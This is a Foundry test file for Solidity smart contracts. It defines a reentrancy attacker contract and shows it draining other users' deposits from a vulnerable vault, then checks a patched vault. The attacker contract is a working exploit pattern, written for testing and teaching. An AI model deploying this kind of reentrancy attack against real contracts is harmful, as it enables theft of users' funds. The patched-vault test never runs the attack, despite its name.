// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Kasa} from "../src/Kasa.sol";
import {KasaGuvenli} from "../src/KasaGuvenli.sol";

/// @notice The attacker. Its receive() calls withdraw() again before the
///         vault has had a chance to zero the balance.
contract Saldirgan {
    Kasa public immutable kasa;
    uint256 public constant DEPOSIT = 1 ether;

    constructor(Kasa kasa_) payable {
        kasa = kasa_;
    }

    function attack() external {
        kasa.deposit{value: DEPOSIT}();
        kasa.withdraw();
    }

    receive() external payable {
        if (address(kasa).balance >= DEPOSIT) {
            kasa.withdraw();
        }
    }
}

contract SoygunTest is Test {
    function test_VulnerableVaultCanBeDrained() public {
        Kasa kasa = new Kasa();

        // Three honest users each park 5 ether in the vault.
        for (uint256 i = 1; i <= 3; i++) {
            address user = address(uint160(1000 + i));
            vm.deal(user, 5 ether);
            vm.prank(user);
            kasa.deposit{value: 5 ether}();
        }
        assertEq(kasa.totalBalance(), 15 ether);

        Saldirgan saldirgan = new Saldirgan{value: 1 ether}(kasa);
        saldirgan.attack();

        // The vault is empty and the attacker walked away with everyone's money.
        assertEq(kasa.totalBalance(), 0);
        assertEq(address(saldirgan).balance, 16 ether);
    }

    function test_PatchedVaultResistsTheSameAttack() public {
        KasaGuvenli kasa = new KasaGuvenli();

        address user = address(uint160(2001));
        vm.deal(user, 5 ether);
        vm.prank(user);
        kasa.deposit{value: 5 ether}();

        vm.prank(user);
        kasa.withdraw();

        assertEq(kasa.totalBalance(), 0);
        assertEq(user.balance, 5 ether);
        assertEq(kasa.balances(user), 0);
    }
}
